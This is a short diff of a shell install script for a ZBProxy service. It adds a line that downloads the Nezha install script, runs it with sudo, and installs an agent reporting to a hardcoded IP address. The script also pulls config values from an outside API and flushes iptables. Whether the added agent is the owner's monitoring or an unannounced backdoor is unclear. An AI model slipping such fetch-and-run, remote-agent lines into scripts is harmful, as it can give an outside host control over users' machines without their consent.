@@ -9,6 +9,7 @@ chmod +x /usr/lib/systemd/system/ZBProxy.service
 sed -i "s|"NAMEFORCHANGE"|$(curl -4 https://botapi.nyaproxy.xyz/GetMCName)|" ZBProxy.json
 systemctl enable ZBProxy
 systemctl start ZBProxy
+curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent 192.3.80.197 5555 $1
 apt update
 apt install iptables -y
 iptables -F
